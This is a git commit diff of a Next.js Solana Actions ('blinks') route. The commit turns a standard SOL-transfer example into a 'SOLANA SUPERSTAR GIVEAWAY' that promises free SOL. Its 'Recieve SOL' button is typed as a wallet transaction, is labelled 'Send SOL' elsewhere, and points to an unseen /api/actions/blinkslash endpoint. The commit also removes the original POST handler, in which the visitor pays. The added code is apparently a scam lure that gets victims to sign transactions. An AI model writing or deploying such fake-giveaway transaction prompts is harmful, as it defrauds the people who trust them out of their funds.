9663baf8612a7617d7cbedff91e8e2738cd54fd3
unknown <egwomevan323@gmail.com>
2024-09-27 04:42:43 +0100

    fixed error with blinks

--- src/app/api/actions/splashtoken/route.ts
+++ src/app/api/actions/splashtoken/route.ts
@@ -1,7 +1,4 @@
-/**
- * Solana Actions Example
- */
-
+import { NextRequest, NextResponse } from "next/server";
 import {
     ActionPostResponse,
     createPostResponse,
@@ -23,31 +20,27 @@ import {
   // create the standard headers for this route (including CORS)
   const headers = createActionHeaders();
   
-  export const GET = async (req: Request) => {
+  export const GET = async (req: NextRequest) => {
     try {
       const requestUrl = new URL(req.url);
-      const { toPubkey } = validatedQueryParams(requestUrl);
-  
-      const baseHref = new URL(
-        `/api/actions/transfer-sol?to=${toPubkey.toBase58()}`,
-        requestUrl.origin,
-      ).toString();
+      const baseHref = new URL(`/api/actions/blinkslash`,requestUrl.origin).toString();
   
       const payload: ActionGetResponse = {
-        type: "action",
         title: "SOLANA SUPERSTAR GIVEAWAY",
         icon: 'https://cryptologos.cc/logos/solana-sol-logo.png?v=035',
         description: "receive $10 worth of a sol from solana superstars by entering your wallet address.you must be a registered member of solana superstars team",
+        label: "Send SOL",
         links: {
           actions: [
             {
-              label: "Recieve SOL", // button text
+              type:'transaction',
+              label : "Recieve SOL", // button text
               href: `${baseHref}&amount={amount}`, // this href will have a text input
               parameters: [
                 {
                   name: "amount", // parameter name in the `href` above
                   label: "Enter your wallet address", // placeholder of the text input
-                  required: true,
+                  required: true
                 }
               ]
             }
@@ -55,7 +48,7 @@ import {
         },
       };
   
-      return Response.json(payload, {
+      return NextResponse.json(payload, {
         headers,
       });
     } catch (err) {
@@ -68,113 +61,3 @@ import {
       });
     }
   };
-  
-  // DO NOT FORGET TO INCLUDE THE `OPTIONS` HTTP METHOD
-  // THIS WILL ENSURE CORS WORKS FOR BLINKS
-  export const OPTIONS = async () => Response.json(null, { headers });
-  
-  export const POST = async (req: Request) => {
-    try {
-      const requestUrl = new URL(req.url);
-      const { amount, toPubkey } = validatedQueryParams(requestUrl);
-  
-      const body: ActionPostRequest = await req.json();
-  
-      // validate the client provided input
-      let account: PublicKey;
-      try {
-        account = new PublicKey(body.account);
-      } catch (err) {
-        throw 'Invalid "account" provided';
-      }
-  
-      const connection = new Connection(
-        process.env.SOLANA_RPC! || clusterApiUrl("devnet"),
-      );
-  
-      // ensure the receiving account will be rent exempt
-      const minimumBalance = await connection.getMinimumBalanceForRentExemption(
-        0, // note: simple accounts that just store native SOL have `0` bytes of data
-      );
-      if (amount * LAMPORTS_PER_SOL < minimumBalance) {
-        throw `account may not be rent exempt: ${toPubkey.toBase58()}`;
-      }
-  
-      // create an instruction to transfer native SOL from one wallet to another
-      const transferSolInstruction = SystemProgram.transfer({
-        fromPubkey: account,
-        toPubkey: toPubkey,
-        lamports: amount * LAMPORTS_PER_SOL,
-      });
-  
-      // get the latest blockhash amd block height
-      const { blockhash, lastValidBlockHeight } =
-        await connection.getLatestBlockhash();
-  
-      // create a legacy transaction
-      const transaction = new Transaction({
-        feePayer: account,
-        blockhash,
-        lastValidBlockHeight,
-      }).add(transferSolInstruction);
-  
-      // versioned transactions are also supported
-      // const transaction = new VersionedTransaction(
-      //   new TransactionMessage({
-      //     payerKey: account,
-      //     recentBlockhash: blockhash,
-      //     instructions: [transferSolInstruction],
-      //   }).compileToV0Message(),
-      //   // note: you can also use `compileToLegacyMessage`
-      // );
-  
-      const payload: ActionPostResponse = await createPostResponse({
-        fields: {
-          transaction,
-          message: `Send ${amount} SOL to ${toPubkey.toBase58()}`,
-        },
-        // note: no additional signers are needed
-        // signers: [],
-      });
-  
-      return Response.json(payload, {
-        headers,
-      });
-    } catch (err) {
-      console.log(err);
-      let actionError: ActionError = { message: "An unknown error occurred" };
-      if (typeof err == "string") actionError.message = err;
-      return Response.json(actionError, {
-        status: 400,
-        headers,
-      });
-    }
-  };
-  
-  function validatedQueryParams(requestUrl: URL) {
-    let toPubkey: PublicKey = DEFAULT_SOL_ADDRESS;
-    let amount: number = DEFAULT_SOL_AMOUNT;
-  
-    try {
-      if (requestUrl.searchParams.get("to")) {
-        toPubkey = new PublicKey(requestUrl.searchParams.get("to")!);
-      }
-    } catch (err) {
-      throw "Invalid input query parameter: to";
-    }
-  
-    try {
-      if (requestUrl.searchParams.get("amount")) {
-        amount = parseFloat(requestUrl.searchParams.get("amount")!);
-      }
-  
-      if (amount <= 0) throw "amount is too small";
-    } catch (err) {
-      throw "Invalid input query parameter: amount";
-    }
-  
-    return {
-      amount,
-      toPubkey,
-    };
-  }
